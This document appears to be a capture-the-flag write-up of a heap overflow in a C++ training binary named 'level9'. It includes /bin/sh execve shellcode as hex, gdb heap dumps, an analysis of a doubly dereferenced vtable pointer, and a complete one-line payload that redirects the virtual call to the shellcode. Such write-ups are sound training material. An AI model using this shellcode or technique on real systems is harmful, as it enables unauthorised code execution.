```
Here is our shellcode (size 24)
\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80
```

Here is the layout of the heap after the two allocation and construction of N object, and before
the call to `setAnnotation`

```bash
(gdb) x/75x 0x804a000
0x804a000:	0x00000000	0x00000071	0x08048848	0x00000000
0x804a010:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a020:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a030:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a040:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a050:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a060:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a070:	0x00000005	0x00000071	0x08048848	0x00000000
0x804a080:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a090:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a0a0:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a0b0:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a0c0:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a0d0:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a0e0:	0x00000006	0x00020f21	0x00000000	0x00000000
0x804a0f0:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a100:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a110:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a120:	0x00000000	0x00000000	0x00000000
```

`0x08048848` indicates start of struct

`instance1->nb` at this + 26 * 4 = `0x00000005`

`instance2->nb` at this + 26 * 4 = `0x00000006`

```bash
(gdb) x 0x08048848
0x8048848 <_ZTV1N+8>:	0x0804873a
(gdb) x 0x0804873a
0x804873a <_ZN1NplERS_>:	0x8be58955
```

this address might be the pointer on member function called at the end of the main return value

### Payload

So the strategy should be to overwrite the member function `0x08048848` and points to another address in the heap that point to a shellcode.
why 2 jump are needed ? we need 2 jump because the call to the member function is dereferenced two times

`return (**(code **)*instance_2)(instance_2, instance_1);` --> here the 2 `*`

so we craft the payload

```bash
./level9 `python -c 'print("A" * 4 + "\x14\xa0\x04\x08" + "\x31\xc0\x99\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80" + "A" * 76 + "\x10\xa0\x04\x08")'`
```

here we have at the end `"\x10\xa0\x04\x08"` that point to an adress (`\x31\xc0\x99\x50`) and this address point to the beginning of the shellcode

